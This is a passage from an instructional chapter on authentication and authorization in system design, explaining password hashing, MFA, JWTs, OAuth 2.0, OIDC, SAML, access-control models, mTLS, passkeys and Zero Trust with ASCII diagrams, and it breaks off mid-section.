# Chapter 19: Authentication and Authorization

## Introduction

Every system that serves more than one user must answer two fundamental questions:
**"Who are you?"** and **"What are you allowed to do?"** These questions map directly
to **Authentication (AuthN)** and **Authorization (AuthZ)** — two pillars of any
secure system design. Getting either wrong can lead to data breaches, privilege
escalation, and catastrophic security failures.

This chapter provides a comprehensive deep-dive into authentication methods,
authorization models, token strategies, and industry-standard protocols like
OAuth 2.0 and OpenID Connect.

---

## 19.1 Authentication (AuthN) vs Authorization (AuthZ)

These terms are often confused, but they address fundamentally different concerns:

| Aspect              | Authentication (AuthN)                  | Authorization (AuthZ)                     |
|---------------------|-----------------------------------------|-------------------------------------------|
| **Question**        | "Who are you?"                          | "What can you do?"                        |
| **Purpose**         | Verify identity                         | Grant or deny access to resources         |
| **When it happens** | Before authorization                    | After authentication                      |
| **Example**         | Logging in with email + password        | Checking if a user can delete a post      |
| **Failure result**  | 401 Unauthorized                        | 403 Forbidden                             |
| **Data used**       | Credentials (password, token, biometric)| Roles, permissions, policies              |

```
+------------------+          +-------------------+          +------------------+
|   User Request   | -------> | Authentication    | -------> | Authorization    |
| (credentials)    |          | "Who are you?"    |          | "Can you do X?"  |
+------------------+          +-------------------+          +------------------+
                                    |                              |
                              [401 if fail]                  [403 if fail]
                                    |                              |
                                    v                              v
                              Identity Verified             Access Granted/Denied
```

**Key insight:** Authentication always precedes authorization. You cannot decide
what someone is allowed to do until you know who they are.

---

## 19.2 Authentication Methods

### 19.2.1 Username/Password Authentication

The oldest and most common method. A user provides a username (or email) and a
password that the system verifies against stored credentials.

#### Password Hashing

**Never store passwords in plaintext.** Instead, use a one-way cryptographic hash.

```
User enters: "MyP@ssw0rd!"
                  |
                  v
        +-------------------+
        | Hash Function     |
        | (bcrypt/argon2)   |
        +-------------------+
                  |
                  v
Stored: "$2b$12$LJ3m4ys5Lg/Gl5PqwK9oYeF8K0kMVJz9XWZQ5rGhJk4..."
```

**Common hashing algorithms:**

| Algorithm   | Type             | Salt Built-in | Memory-Hard | Recommended |
|-------------|------------------|---------------|-------------|-------------|
| MD5         | Fast hash        | No            | No          | **Never**   |
| SHA-256     | Fast hash        | No            | No          | **No**      |
| bcrypt      | Adaptive hash    | Yes           | No          | Yes         |
| scrypt      | Adaptive hash    | Yes           | Yes         | Yes         |
| **Argon2**  | Adaptive hash    | Yes           | Yes         | **Best**    |

**Why "fast" hashes are dangerous:** MD5 and SHA-256 can compute billions of hashes
per second on modern GPUs, making brute-force attacks trivial. Adaptive hashes like
bcrypt and Argon2 are intentionally slow and tunable.

#### Salting

A **salt** is a random value appended to the password before hashing. This ensures
that two users with the same password produce different hashes, defeating
rainbow table attacks.

```
User A: password="hello" + salt="x8Kj2" --> hash("hellox8Kj2") = "a1b2c3..."
User B: password="hello" + salt="Qm9Tz" --> hash("helloQm9Tz") = "d4e5f6..."
```

### 19.2.2 Multi-Factor Authentication (MFA)

MFA requires users to prove their identity using **two or more factors** from
different categories:

| Factor Category       | Description                  | Examples                        |
|-----------------------|------------------------------|---------------------------------|
| Something you know    | Knowledge-based              | Password, PIN, security question|
| Something you have    | Possession-based             | Phone (TOTP), hardware key, SMS |
| Something you are     | Biometric                    | Fingerprint, face scan, iris    |

**Common MFA methods:**

- **TOTP (Time-based One-Time Password):** Apps like Google Authenticator generate
  a 6-digit code that changes every 30 seconds. Based on a shared secret and current
  timestamp (RFC 6238).

```
+--------+     Shared Secret     +-----------+
| Server | <---(during setup)---> | Auth App  |
+--------+                       +-----------+
    |                                  |
    | TOTP = HMAC(secret, time/30)     | TOTP = HMAC(secret, time/30)
    |                                  |
    v                                  v
  "483721"       == match? ==       "483721"
```

- **SMS-based OTP:** A code sent via SMS. Convenient but vulnerable to SIM-swapping
  attacks. **Not recommended** for high-security applications.

- **Hardware keys (FIDO2/WebAuthn):** Physical devices like YubiKey. The gold
  standard — phishing-resistant and cryptographically secure.

### 19.2.3 API Keys

API keys are long random strings used to authenticate **applications** (not users).

```
GET /api/weather?city=London
Headers:
  X-API-Key: sk_live_a1b2c3d4e5f6g7h8i9j0...
```

**Use cases:** Server-to-server communication, third-party API access, metering/billing.

**Security considerations:**
- API keys are **not** a substitute for user authentication
- Transmit only over HTTPS
- Scope keys with minimal permissions
- Rotate keys regularly
- Never embed in client-side code or commit to version control

### 19.2.4 Session-Based Authentication

The traditional approach used by web applications for decades.

```
+--------+                         +---------+                    +-----------+
| Client |                         | Server  |                    | Session   |
| (Browser)                        |         |                    | Store     |
+--------+                         +---------+                    +-----------+
    |                                   |                              |
    |-- POST /login (user, pass) ------>|                              |
    |                                   |-- Create session ----------->|
    |                                   |<-- session_id: "abc123" -----|
    |<-- Set-Cookie: sid=abc123 --------|                              |
    |                                   |                              |
    |-- GET /dashboard                  |                              |
    |   Cookie: sid=abc123 ------------>|                              |
    |                                   |-- Lookup "abc123" ---------->|
    |                                   |<-- {user_id: 42, role: ...} -|
    |<-- 200 OK (dashboard data) -------|                              |
```

**How it works:**
1. User submits credentials
2. Server validates, creates a session object, stores it (in-memory, Redis, DB)
3. Server sends a **session ID** as an HTTP cookie
4. Browser automatically sends the cookie on subsequent requests
5. Server looks up the session ID to identify the user

**Pros:** Easy revocation (delete from store), small cookie size, server controls state.
**Cons:** Server must store state (scalability challenge), sticky sessions or shared store
needed in distributed systems, vulnerable to CSRF without protections.

### 19.2.5 Token-Based Authentication (JWT)

**JSON Web Tokens (JWT)** are self-contained tokens that encode user identity and
claims. The server does not need to store session state.

#### JWT Structure

A JWT consists of three Base64URL-encoded parts separated by dots:

```
xxxxx.yyyyy.zzzzz
  |      |      |
Header Payload Signature
```

**Header:**
```json
{
  "alg": "RS256",
  "typ": "JWT"
}
```

**Payload (Claims):**
```json
{
  "sub": "user_12345",
  "name": "Jane Doe",
  "email": "jane@example.com",
  "role": "admin",
  "iat": 1700000000,
  "exp": 1700003600
}
```

**Signature:**
```
RSASHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  privateKey
)
```

#### Access Tokens vs Refresh Tokens

```
+--------+                              +-------------+
| Client |                              | Auth Server |
+--------+                              +-------------+
    |                                         |
    |-- POST /login (credentials) ----------->|
    |<-- access_token (15 min) + -------------|
    |   refresh_token (7 days)                |
    |                                         |
    |-- GET /api/data                         |
    |   Authorization: Bearer <access_token> ->| Resource Server
    |<-- 200 OK -------------------------------|
    |                                          |
    |   ... access_token expires ...           |
    |                                          |
    |-- POST /token/refresh                    |
    |   Body: {refresh_token} --------------->|
    |<-- new access_token (15 min) -----------|
```

| Property          | Access Token               | Refresh Token              |
|-------------------|----------------------------|----------------------------|
| **Lifetime**      | Short (5-60 min)           | Long (days to weeks)       |
| **Purpose**       | Access protected resources | Obtain new access tokens   |
| **Storage**       | Memory (preferred)         | HttpOnly secure cookie     |
| **Sent to**       | Resource servers (APIs)    | Auth server only           |
| **If compromised**| Limited damage (short-lived)| Must be revoked immediately|

#### Token Rotation

**Refresh token rotation** is a security best practice where each time a refresh token
is used, a new refresh token is issued and the old one is invalidated. If an attacker
steals and uses an old refresh token, the server detects the reuse and invalidates
the entire token family.

#### JWT Pitfalls

1. **Token size:** JWTs can grow large (especially with many claims), adding overhead
   to every HTTP request. Sessions use a small cookie ID instead.

2. **Revocation difficulty:** JWTs are stateless — the server cannot easily "invalidate"
   a token before its expiry. Workarounds: short expiry, token blacklist (adds state),
   or token versioning.

3. **Sensitive data exposure:** JWT payloads are Base64-encoded (not encrypted). Never
   put secrets, passwords, or sensitive PII in the payload.

4. **Algorithm confusion attacks:** Always validate the `alg` header server-side.
   The `"none"` algorithm vulnerability has caused real breaches.

---

## 19.3 OAuth 2.0

OAuth 2.0 is an **authorization framework** (not authentication) that allows third-party
applications to access resources on behalf of a user without exposing their credentials.

**Key roles:**
- **Resource Owner:** The user who owns the data
- **Client:** The application requesting access
- **Authorization Server:** Issues tokens (e.g., Google, GitHub)
- **Resource Server:** Hosts the protected resources (e.g., Google Drive API)

### 19.3.1 Authorization Code Flow (Web Apps)

The most secure and most common flow for server-side web applications.

```
+--------+                               +---------------+
| User   |                               | Auth Server   |
| Browser|                               | (e.g. Google) |
+--------+                               +---------------+
    |                                           |
    |  1. Click "Login with Google"             |
    |  -------> /authorize?                     |
    |           response_type=code&             |
    |           client_id=XYZ&                  |
    |           redirect_uri=https://app/cb&    |
    |           scope=profile email             |
    |           state=random123 --------------->|
    |                                           |
    |  2. User sees consent screen              |
    |  <--- "Allow MyApp to access profile?" ---|
    |                                           |
    |  3. User approves                         |
    |  ---------------------------------------->|
    |                                           |
    |  4. Redirect to app with auth code        |
    |  <--- 302 https://app/cb?code=AUTH_CODE   |
    |        &state=random123 ------------------|
    |                                           |
    +--------+                                  |
    | App    |                                  |
    | Server |                                  |
    +--------+                                  |
    |  5. Exchange code for tokens (server-to-server)
    |  POST /token                              |
    |  {code, client_id, client_secret,         |
    |   redirect_uri, grant_type}  ------------>|
    |                                           |
    |  6. Receive tokens                        |
    |  <--- {access_token, refresh_token,       |
    |        id_token, expires_in} -------------|
```

### 19.3.2 Authorization Code + PKCE (SPAs, Mobile Apps)

**PKCE** (Proof Key for Code Exchange, pronounced "pixy") adds a layer of protection
for **public clients** that cannot securely store a client secret.

```
+------------+                          +-----------+
| SPA/Mobile |                          | Auth      |
| App        |                          | Server    |
+------------+                          +-----------+
    |                                        |
    | 1. Generate:                           |
    |    code_verifier = random(43-128 chars)|
    |    code_challenge = SHA256(verifier)   |
    |                                        |
    | 2. /authorize?                         |
    |    code_challenge=xxx&                 |
    |    code_challenge_method=S256 -------->|
    |                                        |
    | 3. User authenticates + consents       |
    | <-- redirect with ?code=AUTH_CODE -----|
    |                                        |
    | 4. POST /token                         |
    |    {code, code_verifier} ------------->|
    |                                        |
    |    Server verifies:                    |
    |    SHA256(code_verifier) == stored     |
    |    code_challenge                      |
    |                                        |
    | <-- {access_token, refresh_token} -----|
```

Even if an attacker intercepts the authorization code, they cannot exchange it
without the `code_verifier`.

### 19.3.3 Client Credentials Flow (Machine-to-Machine)

Used when no user is involved — service accounts, microservices, cron jobs.

```
+-----------+                          +-----------+
| Service A |                          | Auth      |
| (Client)  |                          | Server    |
+-----------+                          +-----------+
    |                                        |
    | POST /token                            |
    | {grant_type=client_credentials,        |
    |  client_id=xxx,                        |
    |  client_secret=yyy,                    |
    |  scope=read:orders} ----------------->|
    |                                        |
    | <-- {access_token, expires_in} --------|
```

### 19.3.4 Implicit Flow (Deprecated)

The implicit flow returned tokens directly in the URL fragment (`#access_token=...`).
**It is now deprecated** (OAuth 2.1) because:
- Tokens are exposed in browser history and logs
- No refresh tokens — user must re-authenticate
- Vulnerable to token interception attacks
- PKCE provides a secure alternative for public clients

---

## 19.4 OpenID Connect (OIDC)

OAuth 2.0 is for **authorization**, not authentication. **OpenID Connect (OIDC)**
is an identity layer built on top of OAuth 2.0 that adds **authentication**.

```
+-------------------------------------------+
|             OpenID Connect (OIDC)         |
|  +--------------------------------------+ |
|  |          OAuth 2.0                    | |
|  |  +----------------------------------+| |
|  |  |         HTTP / TLS              | | |
|  |  +----------------------------------+| |
|  +--------------------------------------+ |
+-------------------------------------------+
```

**What OIDC adds to OAuth 2.0:**
- **ID Token:** A JWT that contains user identity claims (name, email, etc.)
- **UserInfo endpoint:** `/userinfo` returns additional profile data
- **Standardized scopes:** `openid`, `profile`, `email`, `address`, `phone`
- **Discovery:** `/.well-known/openid-configuration` for automatic endpoint discovery

When you see "Login with Google" — that's OIDC in action. You get an `id_token`
(authentication) alongside the `access_token` (authorization).

---

## 19.5 SAML (Security Assertion Markup Language)

SAML is an **XML-based** protocol primarily used for **enterprise Single Sign-On (SSO)**.
It's older and more complex than OIDC but deeply entrenched in enterprise environments.

```
+--------+                  +-----+                  +-----+
| User   | --- 1. Access -->| SP  | --- 2. Redirect->| IdP |
| Browser|                  |(App)|                  |(Okta)|
+--------+                  +-----+                  +-----+
    ^                                                    |
    |              3. User authenticates at IdP          |
    |<---------------------------------------------------|
    |                                                    |
    | 4. POST SAML Assertion (signed XML) to SP          |
    |---------------------------------------------------->
    |                         SP validates assertion      |
    |<---- 5. Access granted -----------------------------|
```

**SP** = Service Provider (your application)
**IdP** = Identity Provider (Okta, Azure AD, OneLogin)

| Feature      | SAML                | OIDC                          |
|-------------|---------------------|-------------------------------|
| Format      | XML                 | JSON/JWT                      |
| Transport   | HTTP POST/Redirect  | HTTP REST                     |
| Use case    | Enterprise SSO      | Web/mobile apps, APIs         |
| Complexity  | High                | Moderate                      |
| Mobile      | Poor support        | Excellent                     |
| Adoption    | Legacy enterprise   | Modern applications           |

---

## 19.6 Single Sign-On (SSO)

SSO allows users to **authenticate once** and access multiple applications without
re-entering credentials.

```
                       +-------------------+
                       | Identity Provider |
                       | (Okta/Azure AD)   |
                       +-------------------+
                        /       |        \
                       /        |         \
                +------+   +-------+   +-------+
                | App A |   | App B |   | App C |
                | (HR)  |   | (CRM) |   | (Wiki)|
                +------+   +-------+   +-------+

User logs in ONCE at the IdP --> gains access to all apps
```

**Popular Identity Providers:** Okta, Auth0 (by Okta), Azure Active Directory,
Google Workspace, AWS IAM Identity Center, Keycloak (open source).

---

## 19.7 Authorization Models

### 19.7.1 RBAC (Role-Based Access Control)

The most widely used authorization model. Users are assigned **roles**, and roles
have **permissions**.

```
Users           Roles            Permissions
+-------+      +--------+       +------------------+
| Alice  |----->| Admin  |------>| create:post      |
| Bob    |----->| Editor |------>| edit:post         |
| Carol  |----->| Viewer |------>| delete:post       |
+-------+      +--------+       | view:post         |
                                 | manage:users      |
                                 +------------------+

Admin:  create, edit, delete, view, manage:users
Editor: create, edit, view
Viewer: view
```

**Pros:** Simple, intuitive, widely supported.
**Cons:** Role explosion in complex systems, coarse-grained.

### 19.7.2 ABAC (Attribute-Based Access Control)

Decisions based on **attributes** of the user, resource, action, and environment.

```
Policy: ALLOW if
  user.department == "engineering" AND
  resource.classification != "top-secret" AND
  action == "read" AND
  environment.time BETWEEN "09:00" AND "18:00" AND
  environment.ip IN corporate_network
```

**Pros:** Extremely flexible and fine-grained.
**Cons:** Complex to manage, harder to audit, policy language learning curve.

### 19.7.3 ReBAC (Relationship-Based Access Control)

Authorization based on **relationships** between entities. Popularized by
**Google Zanzibar** (used by Google Drive, YouTube, Google Cloud IAM).

```
+----------+   owner    +----------+
| Alice    |----------->| Doc #123 |
+----------+            +----------+
                             |
                          parent
                             |
                             v
                        +----------+
                        | Folder A |
                        +----------+
                             |
                          viewer
                             |
                             v
                        +----------+
                        | Bob      |
                        +----------+

Question: Can Bob view Doc #123?
Answer: Bob is a viewer of Folder A, which is the parent of Doc #123.
        Through relationship traversal --> YES, Bob can view Doc #123.
```

**Implementations:** Google Zanzibar, SpiceDB, Authzed, OpenFGA (by Auth0).

### 19.7.4 ACL (Access Control Lists)

A direct mapping of subjects to permissions on specific resources.

```
File: /reports/q4-revenue.pdf
+----------+-------------------+
| Subject  | Permissions       |
+----------+-------------------+
| Alice    | read, write       |
| Bob      | read              |
| Finance  | read, write, del  |
+----------+-------------------+
```

**Pros:** Straightforward for file-system-like resources.
**Cons:** Doesn't scale well — managing individual entries across millions of resources
becomes unmanageable.

---

## 19.8 Comparison Table: Session vs JWT vs OAuth

| Feature               | Session-Based           | JWT (Stateless)          | OAuth 2.0               |
|-----------------------|-------------------------|--------------------------|--------------------------|
| **State**             | Server-side             | Client-side (token)      | Depends on flow          |
| **Scalability**       | Needs shared store      | Highly scalable          | Highly scalable          |
| **Revocation**        | Easy (delete session)   | Hard (needs blacklist)   | Token expiry + revoke    |
| **Use case**          | Traditional web apps    | APIs, microservices      | Third-party access       |
| **Security**          | CSRF vulnerable         | XSS vulnerable if in LS  | Depends on implementation|
| **Token size**        | Small (session ID)      | Large (entire payload)   | Varies                   |
| **Cross-domain**      | Difficult (cookies)     | Easy (Bearer header)     | Built for it             |
| **Mobile friendly**   | Poor                    | Excellent                | Excellent                |

---

## 19.9 Storing Credentials Securely

### Password Storage Rules

1. **Hash with Argon2id** (or bcrypt as fallback) with a high work factor
2. Use a **unique salt per password** (built into Argon2/bcrypt)
3. **Never** store plaintext, encrypted (reversible), MD5, or SHA-family hashes
4. Enforce minimum password length (12+ characters), avoid complexity rules
5. Check against **breached password databases** (Have I Been Pwned API)

### Secret Management

```
+------------------+     +------------------+     +------------------+
| Application Code |---->| Secret Manager   |---->| Encrypted Store  |
| (no hardcoded    |     | (Vault, AWS SM)  |     | (AES-256, HSM)   |
|  secrets)        |     +------------------+     +------------------+
+------------------+            |
                         Audit log of
                         all access
```

**Tools:** HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, GCP Secret Manager.

**Best practices:**
- Rotate secrets on a schedule (90 days or less)
- Use short-lived dynamic credentials where possible
- Audit all secret access
- Use least-privilege access to secret stores

---

## 19.10 Certificate-Based Authentication and mTLS

### How TLS Client Certificates Work

Standard TLS (HTTPS) only authenticates the **server** — the client verifies the server's
certificate. **Mutual TLS (mTLS)** extends this so that the **server also verifies the client's
certificate** — both parties authenticate each other.

```
  Standard TLS (one-way):              Mutual TLS (two-way):
  
  Client ---- "Show me your cert" ---> Server
  Client <--- Server Certificate ----- Server
  Client: "I trust this cert" (checks CA)
  [Connection established]
  Server has NO IDEA who the client is.
  
  mTLS:
  Client ---- "Show me your cert" ---> Server
  Client <--- Server Certificate ----- Server
  Client: "I trust this cert" ✓
  Server ---- "Show me YOUR cert" ---> Client
  Server <--- Client Certificate ----- Client
  Server: "I trust this cert" ✓
  [Connection established — BOTH parties verified]
```

### mTLS for Service-to-Service Authentication

```
  In a microservices architecture, services must authenticate EACH OTHER
  to prevent unauthorized services from accessing internal APIs.
  
  Without mTLS:
  +----------+     HTTP (plaintext)     +----------+
  | Service  | -----------------------> | Payment  |
  | A        |  Anyone can call this!   | Service  |
  +----------+                          +----------+
  A rogue container or compromised service can call Payment Service!
  
  With mTLS:
  +----------+     mTLS (encrypted)     +----------+
  | Service  | ---- Client Cert ------> | Payment  |
  | A        | <--- Server Cert ------- | Service  |
  +----------+     Both verified!       +----------+
  Only services with valid certificates (issued by your CA) can communicate.
  
  Certificate lifecycle:
  1. Internal Certificate Authority (CA) issues short-lived certs to each service
  2. Each service has: private key + certificate (signed by CA)
  3. Services present their cert during TLS handshake
  4. Receiving service validates cert against the CA
  5. Certificates auto-rotated (e.g., every 24 hours)
  
  Who manages all this?
  +---------------------+----------------------------------------------+
  | Tool                | How It Helps                                 |
  +---------------------+----------------------------------------------+
  | Istio (service mesh)| Automatic mTLS between all pods in the mesh. |
  |                     | Envoy sidecar handles cert rotation.         |
  +---------------------+----------------------------------------------+
  | Linkerd             | Automatic mTLS with identity via service     |
  |                     | accounts. Zero-config.                       |
  +---------------------+----------------------------------------------+
  | SPIFFE/SPIRE        | Standardized service identity framework.     |
  |                     | Issues SVID (SPIFFE Verifiable Identity Doc) |
  |                     | to each workload. Platform-agnostic.         |
  +---------------------+----------------------------------------------+
  | HashiCorp Vault     | PKI secrets engine issues short-lived certs. |
  |                     | API-driven certificate generation.           |
  +---------------------+----------------------------------------------+
  | AWS Private CA      | Managed CA for issuing private certificates. |
  +---------------------+----------------------------------------------+
```

### SPIFFE/SPIRE — Standardized Service Identity

```
  SPIFFE (Secure Production Identity Framework for Everyone) gives every
  workload a cryptographic identity without requiring application changes.
  
  SPIFFE ID format:
  spiffe://trust-domain/path
  spiffe://mycompany.com/service/payment
  spiffe://mycompany.com/service/order
  
  SPIRE (SPIFFE Runtime Environment) implements SPIFFE:
  
  +------------------------------------------------------+
  | SPIRE Server (central)                                |
  | - Manages node and workload registration              |
  | - Issues SVIDs (X.509 certificates or JWT tokens)     |
  +------------------------------------------------------+
              |                           |
  +-----------v----------+   +-----------v-----------+
  | SPIRE Agent (Node A) |   | SPIRE Agent (Node B)  |
  | - Attests local       |   | - Attests local        |
  |   workloads (via PID, |   |   workloads             |
  |   Kubernetes SA, etc.)|   |                         |
  | - Provides certs via  |   | - Provides certs via    |
  |   Workload API        |   |   Workload API          |
  +-----------------------+   +-------------------------+
         |                              |
  +------v------+               +-------v------+
  | Payment Svc |               | Order Svc    |
  | SVID: spiffe|               | SVID: spiffe |
  | ://co.com/  |               | ://co.com/   |
  | payment     |               | order        |
  +-------------+               +--------------+
```

---

## 19.11 Passwordless Authentication

Passwordless authentication removes the password entirely, replacing it with something
more secure and user-friendly.

### Magic Links (Email-Based Passwordless)

```
  Flow:
  1. User enters email address
  2. Server generates a one-time token and sends an email:
     "Click here to log in: https://app.com/auth?token=abc123def456"
  3. User clicks the link
  4. Server validates the token (check: exists, not expired, not used)
  5. User is authenticated — session or JWT issued
  
  +--------+   email     +--------+   click     +--------+
  | User   |------------>| Server |------------>| User   |
  | "Login"|             | sends  |             | logged |
  |        |             | link   |             | in!    |
  +--------+             +--------+             +--------+
  
  Security:
  - Token is single-use (consumed on first click)
  - Token expires quickly (5-15 minutes)
  - Token is cryptographically random (128+ bits)
  - Link sent over email (email account = authentication factor)
  
  Used by: Slack, Medium, Notion (as an option)
  
  Pros: No passwords to remember, simple UX
  Cons: Dependent on email delivery speed, email account = keys to kingdom
```

### WebAuthn / FIDO2 — The Future of Authentication

```
  WebAuthn is a W3C standard that uses PUBLIC KEY CRYPTOGRAPHY for
  authentication. No passwords, no shared secrets, phishing-resistant.
  
  Registration (one-time setup):
  
  +--------+    1. "Register"    +--------+
  | User   |------------------->| Server |
  | Browser|                    |        |
  +--------+                    +--------+
      |                              |
      | 2. Challenge (random nonce)  |
      |<-----------------------------|
      |                              |
      | 3. User touches fingerprint  |
      |    reader / security key     |
      |                              |
      | 4. Authenticator creates:    |
      |    - Private key (STORED     |
      |      on device, NEVER leaves)|
      |    - Public key (sent to     |
      |      server)                 |
      |                              |
      |--- 5. Public key + signed -->|
      |    attestation               |
      |                              | 6. Server stores public key
      |                              |    for this user
  
  Authentication (each login):
  
  +--------+    1. "Login"       +--------+
  | User   |------------------->| Server |
  +--------+                    +--------+
      |                              |
      | 2. Challenge (random nonce)  |
      |<-----------------------------|
      |                              |
      | 3. User touches fingerprint  |
      |    / face scan / security key|
      |                              |
      | 4. Authenticator signs the   |
      |    challenge with PRIVATE key|
      |                              |
      |--- 5. Signed challenge ----->|
      |                              | 6. Server verifies signature
      |                              |    with stored PUBLIC key
      |<--- 7. Authenticated! ------|
  
  Why WebAuthn is superior to passwords:
  +------------------------------------------------------------------+
  | Threat                 | Password    | WebAuthn                   |
  +------------------------------------------------------------------+
  | Phishing               | Vulnerable  | IMMUNE (origin-bound)      |
  | Credential stuffing    | Vulnerable  | IMMUNE (no shared secret)  |
  | Database breach        | Hashes leak | Only public keys stored    |
  | Man-in-the-middle      | Vulnerable  | IMMUNE (challenge-response)|
  | Replay attack          | Possible    | IMMUNE (unique challenge)  |
  +------------------------------------------------------------------+
```

### Passkeys — WebAuthn Made Simple

```
  Passkeys are the consumer-friendly implementation of WebAuthn,
  backed by Apple, Google, and Microsoft.
  
  How passkeys differ from traditional WebAuthn:
  - Synced across devices (via iCloud Keychain, Google Password Manager)
  - No physical security key needed (use phone's biometric)
  - Cross-device auth: scan QR code on phone to log in on laptop
  
  User experience:
  1. Visit website
  2. Click "Sign in with Passkey"
  3. Touch fingerprint sensor (or Face ID)
  4. Done! (no password, no OTP, no email link)
  
  Adoption timeline:
  - 2022: Apple, Google, Microsoft commit to passkeys
  - 2023: Major sites adopt (GitHub, Google, PayPal, eBay, Best Buy)
  - 2025+: Expected to replace passwords for most consumer applications
  
  Passkeys are THE recommended authentication method for new applications.
```

---

## 19.12 Authentication in Microservices Architecture

In a monolithic application, auth is simple — one session store, one auth check. In
microservices, every service needs to verify the caller's identity, and requests may
traverse 5-10 services. This requires careful architecture.

### Pattern 1: API Gateway Authentication

```
  The API Gateway handles ALL authentication. Backend services trust the gateway.
  
  +--------+    +-------------+    +----------+    +----------+    +----------+
  | Client |--->| API Gateway |--->| Order    |--->| Payment  |--->| Inventory|
  | (JWT)  |    |             |    | Service  |    | Service  |    | Service  |
  +--------+    | 1. Validate |    |          |    |          |    |          |
                |    JWT      |    |          |    |          |    |          |
                | 2. Extract  |    |          |    |          |    |          |
                |    claims   |    |          |    |          |    |          |
                | 3. Add user |    |          |    |          |    |          |
                |    context  |    |          |    |          |    |          |
                |    headers  |    |          |    |          |    |          |
                +-------------+    +----------+    +----------+    +----------+
                
  Gateway adds headers:
  X-User-ID: 42
  X-User-Role: admin
  X-User-Email: alice@example.com
  
  Backend services:
  - Read user context from trusted headers
  - Do NOT validate the JWT themselves (gateway already did)
  - MUST only be reachable via the gateway (network policy)
  
  Pros:
  + Auth logic centralized (one place to update)
  + Backend services are simpler (no JWT validation code)
  + Single point for rate limiting, throttling, API key validation
  
  Cons:
  - Gateway is a single point of failure
  - Backend services blindly trust headers (if bypassed, disaster)
  - Must enforce network policies strictly
```

### Pattern 2: Token Propagation (Each Service Validates)

```
  The original JWT is forwarded to EVERY downstream service. Each service
  validates the token independently.
  
  +--------+    +----------+    +----------+    +----------+
  | Client |--->| Order    |--->| Payment  |--->| Inventory|
  | JWT    |    | Service  |    | Service  |    | Service  |
  +--------+    |          |    |          |    |          |
                | Validate |    | Validate |    | Validate |
                | JWT ✓    |    | JWT ✓    |    | JWT ✓    |
                +----------+    +----------+    +----------+
  
  Each service:
  1. Reads JWT from Authorization header
  2. Validates signature (using public key from JWKS endpoint)
  3. Checks expiry, issuer, audience claims
  4. Extracts user identity and roles
  5. Makes authorization decisions locally
  
  Pros:
  + No single point of failure (each service is self-sufficient)
  + Works even if gateway is compromised (defense in depth)
  + Services can make fine-grained authz decisions based on claims
  
  Cons:
  - JWT validation overhead in every service (~0.1ms per validation)
  - Token must contain all needed claims (can grow large)
  - Every service needs access to the signing public key (JWKS endpoint)
  
  This is the RECOMMENDED pattern for most microservice architectures.
```

### Pattern 3: Service-to-Service Authentication (Internal Auth)

```
  Problem: The Order Service calls the Payment Service. How does Payment
  know that Order Service is legitimate (not a rogue container)?
  
  Solution 1: mTLS (described in section 19.10)
  - Each service has a certificate issued by internal CA
  - Envoy/Istio handles automatically
  
  Solution 2: Internal JWT (service tokens)
  - Each service has its own client_id/secret
  - Obtains a short-lived JWT from the auth server (Client Credentials flow)
  - Sends BOTH the user JWT and its own service JWT:
  
    Authorization: Bearer <user-jwt>           (who is the user)
    X-Service-Token: Bearer <service-jwt>       (who is the calling service)
  
  Solution 3: SPIFFE/SPIRE (described in section 19.10)
  - Cryptographic workload identity
  - Most mature solution for large-scale deployments
  
  +--------+                 +--------+
  | Order  |---user JWT----->|Payment |
  | Service|---service JWT-->|Service |
  |        |---mTLS cert---->|        |
  +--------+                 +--------+
  
  Payment Service verifies:
  1. User JWT: valid, not expired, has "payment:charge" scope
  2. Service JWT: caller is "order-service" (not some random pod)
  3. mTLS cert: TLS connection is from a trusted service identity
```

### Pattern 4: Token Exchange (TokenExchange RFC 8693)

```
  Problem: User calls Service A with token scoped to Service A. Service A
  needs to call Service B, but should use a token scoped for Service B
  (principle of least privilege).
  
  Solution: Service A exchanges its token for a new token scoped for Service B.
  
  +--------+   Token(scope:A)   +--------+   Exchange    +------+
  | User   |------------------>| Service|-------------->| Auth |
  +--------+                   | A      |               |Server|
                               |        |<--- Token ----|      |
                               |        |   (scope:B)   +------+
                               |        |
                               |        |--- Token(scope:B) ---> +--------+
                               +--------+                        |Service |
                                                                 | B      |
                                                                 +--------+
  
  POST /oauth/token
  {
    grant_type: "urn:ietf:params:oauth:grant-type:token-exchange",
    subject_token: "<user's original JWT>",
    subject_token_type: "urn:ietf:params:oauth:token-type:access_token",
    audience: "service-b",
    scope: "payment:read payment:charge"
  }
  
  Returns: New JWT scoped specifically for Service B.
  
  Benefits:
  + Least privilege: each service gets ONLY the permissions it needs
  + Audit trail: auth server logs every token exchange
  + Revocation: revoking the original token cascades to all exchanged tokens
```

---

## 19.13 Zero Trust Architecture

**Zero Trust** is a security model that assumes **no implicit trust** — every request must
be authenticated and authorized, regardless of network location.

```
  Traditional Perimeter Security:         Zero Trust:
  
  +------ Firewall -------+               Everything is untrusted.
  |  TRUSTED ZONE         |               Every request is verified.
  |                       |
  |  Service A --> B      |               Service A --[verify]--> B
  |  (no auth, they're    |               Service B --[verify]--> C
  |   inside the wall!)   |               User     --[verify]--> API
  |                       |               Even from "inside" the network.
  +---------- | ----------+
               |
          UNTRUSTED
          (Internet)
  
  "The network perimeter is dead. Assume breach."
```

### Zero Trust Principles

```
  1. VERIFY EXPLICITLY
  +-------------------------------------------------------------------+
  | Always authenticate and authorize based on ALL available signals: |
  | - User identity (JWT, certificate)                                |
  | - Device health (is the device compliant? patched? enrolled?)     |
  | - Location (known office IP? VPN? coffee shop?)                   |
  | - Request context (time, resource sensitivity, anomaly score)     |
  +-------------------------------------------------------------------+
  
  2. LEAST PRIVILEGE ACCESS
  +-------------------------------------------------------------------+
  | Grant minimum permissions needed for the specific task.           |
  | - Time-bound access (expire after 1 hour, not forever)           |
  | - Just-in-time (JIT) access (request access, auto-expires)       |
  | - Scope-limited tokens (read-only, specific resources)           |
  +-------------------------------------------------------------------+
  
  3. ASSUME BREACH
  +-------------------------------------------------------------------+
  | Design as if attackers are ALREADY inside the network.            |
  | - Encrypt all traffic (mTLS everywhere, even internal)            |
  | - Segment the network (microsegmentation)                        |
  | - Log and monitor everything (detect lateral movement)           |
  | - Minimize blast radius (bulkhead pattern, least privilege)      |
  +-------------------------------------------------------------------+
```

### Google BeyondCorp — Zero Trust Pioneer

```
  Google's BeyondCorp (2014) was the first large-scale Zero Trust deployment:
  
  Traditional VPN model:                   BeyondCorp:
  
  Employee at home                         Employee at home
  -> VPN into corporate network            -> Accesses app directly via browser
  -> Full access to everything             -> Access Proxy checks:
     inside the network                       1. User identity (SSO/MFA)
